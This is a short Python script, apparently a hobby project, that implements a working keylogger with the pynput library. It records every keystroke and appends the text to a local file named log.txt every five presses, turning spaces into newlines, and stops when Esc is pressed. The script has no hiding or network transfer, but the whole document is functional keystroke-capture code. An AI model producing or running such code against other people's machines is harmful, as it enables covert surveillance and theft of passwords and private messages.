#biplov

from pynput.keyboard import Key, Controller, Listener


keys=[]
count = 0

def on_press(key):
    global keys, count
    
    keys.append(key)
    count +=1

    #this saves the data when the number or keys pressed is at least 5.
    if count >= 5:
        count = 0
        write_file(keys)
        keys=[]


def write_file(keys):    
    with open('log.txt', 'a') as file:
        for key in keys:
            k = str(key).replace("'","")
            #Every space is saved as a new line.
            if k.find('space') > 0 :
                file.write('\n')
            #Ignores keys like Shift, backspace etc and write other keys
            elif k.find('Key') == -1:
                file.write(k)
                
        

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()